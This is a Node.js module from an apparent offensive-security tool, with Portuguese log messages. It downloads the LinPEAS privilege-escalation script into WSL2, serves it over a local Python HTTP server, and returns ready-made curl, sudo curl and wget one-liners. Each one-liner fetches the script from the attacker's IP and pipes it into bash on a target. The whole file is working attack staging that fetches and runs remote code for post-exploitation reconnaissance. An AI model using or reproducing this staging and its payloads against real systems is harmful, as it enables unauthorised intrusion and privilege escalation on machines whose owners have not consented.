// cloudos-backend/privescManager.js
const { spawn } = require('child_process');
const os = require('os');

function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const iface of Object.values(interfaces)) {
        for (const config of iface) {
            if (config.family === 'IPv4' && !config.internal) return config.address;
        }
    }
    return '127.0.0.1';
}

async function setupPrivesc(sendLog) {
    const ip = getLocalIP();
    const port = 8000;
    const toolsDir = '/tmp/cloudos_tools';
    
    if (sendLog) sendLog('⚙️ Configurando ambiente de Pós-Exploração no WSL2...');

    // Cria diretório, faz download do LinPEAS e instancia HTTP Server no WSL
    const cmd = `mkdir -p ${toolsDir} && if [ ! -f ${toolsDir}/linpeas.sh ]; then wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O ${toolsDir}/linpeas.sh && chmod +x ${toolsDir}/linpeas.sh; fi && cd ${toolsDir} && python3 -m http.server ${port}`;

    try {
        const wslArgs = ['-e', 'bash', '-c', cmd];
        spawn('wsl.exe', wslArgs);
        if (sendLog) sendLog(`✅ Servidor HTTP de Pós-Exploração ativo em http://${ip}:${port}`);
    } catch (err) {
        if (sendLog) sendLog(`⚠️ Aviso ao iniciar HTTP Server: ${err.message}`);
    }

    const payload = `curl http://${ip}:${port}/linpeas.sh | bash`;
    const payloadSudo = `sudo curl http://${ip}:${port}/linpeas.sh | bash`;
    const wgetPayload = `wget -q -O - http://${ip}:${port}/linpeas.sh | bash`;

    return {
        ip,
        port,
        payloads: {
            curl: payload,
            sudo: payloadSudo,
            wget: wgetPayload
        }
    };
}

module.exports = { setupPrivesc, getLocalIP };
